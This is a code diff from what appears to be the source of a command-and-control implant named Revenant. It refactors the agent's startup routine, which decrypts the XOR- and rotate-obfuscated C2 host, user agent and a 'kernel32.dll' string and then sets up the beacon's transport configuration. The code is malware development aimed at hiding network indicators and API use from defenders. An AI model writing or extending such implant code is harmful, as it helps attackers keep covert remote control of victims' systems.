@@ -1,7 +1,8 @@
 #include "Asm.h"
 #include "Core.h"
-#include "Config.h"
 #include "Poly.h"
+#include "Config.h"
+#include "Strings.h"
 #include "Package.h"
 #include "Command.h"
 #include "Revenant.h"
@@ -13,24 +14,26 @@ VOID RvntInit() {
 
     // Init Connection info
     // UserAgent and Host IP always obfuscated
-    UCHAR s_xk[]        = S_XK;
+    UCHAR XOR_KEY[] = S_XK;
+    mem_cpy(Instance.XOR_KEY, XOR_KEY, 0x3);
+
     UCHAR e_UserAgent[] = CONFIG_USER_AGENT;
     UCHAR e_Host[]      = CONFIG_HOST;
 
     UCHAR d_UserAgent[sizeof(e_UserAgent)] = {0};
     UCHAR d_Host[sizeof(e_Host)] = {0};
 
-    ROL_AND_DECRYPT((CONST CHAR*)e_UserAgent, sizeof(e_UserAgent), 1, (CHAR*) d_UserAgent, (PCCH) s_xk);
-    ROL_AND_DECRYPT((CONST CHAR*)e_Host, sizeof(e_Host), 1, (CHAR*) d_Host, (PCCH) s_xk);
+    ROL_AND_DECRYPT((CONST CHAR*)e_UserAgent, sizeof(e_UserAgent), 1, (CHAR*) d_UserAgent, (PCCH) Instance.XOR_KEY);
+    ROL_AND_DECRYPT((CONST CHAR*)e_Host, sizeof(e_Host), 1, (CHAR*) d_Host, (PCCH) Instance.XOR_KEY);
 
-    PWCHAR w_UserAgent = NULL;
-    PWCHAR w_Host = NULL;
+    PWCHAR wcUserAgent = NULL;
+    PWCHAR wcHost = NULL;
 
-    w_UserAgent = str_to_wide( (PCCH) d_UserAgent);
-    w_Host = str_to_wide((PCCH) d_Host);
+    wcUserAgent = str_to_wide( (PCCH) d_UserAgent);
+    wcHost = str_to_wide((PCCH) d_Host);
 
-    Instance.Config.Transport.UserAgent = w_UserAgent;
-    Instance.Config.Transport.Host      = w_Host;
+    Instance.Config.Transport.UserAgent = wcUserAgent;
+    Instance.Config.Transport.Host      = wcHost;
     Instance.Config.Transport.Port      = CONFIG_PORT;
     Instance.Config.Transport.Secure    = CONFIG_SECURE;
 
@@ -45,7 +48,7 @@ VOID RvntInit() {
     UCHAR s_string[] = S_KERNEL32;
     UCHAR d_string[13] = {0};
 
-    ROL_AND_DECRYPT((CONST CHAR *)s_string, sizeof(s_string), 1, (CHAR*) d_string, (CONST CHAR *) s_xk);
+    ROL_AND_DECRYPT((CONST CHAR *)s_string, sizeof(s_string), 1, (CHAR*) d_string, (CONST CHAR *) Instance.XOR_KEY);
 #else
 
     UCHAR d_string[13] = {'k','e','r','n','e','l','3','2','.','d','l','l',0x0};
@@ -70,7 +73,6 @@ VOID RvntInit() {
     GetNativeSystemInfo(&si);
 
     Instance.Session.OSArch = si.wProcessorArchitecture;
-
     Instance.Session.ProcArch = PROCESS_AGENT_ARCH ;
 
 
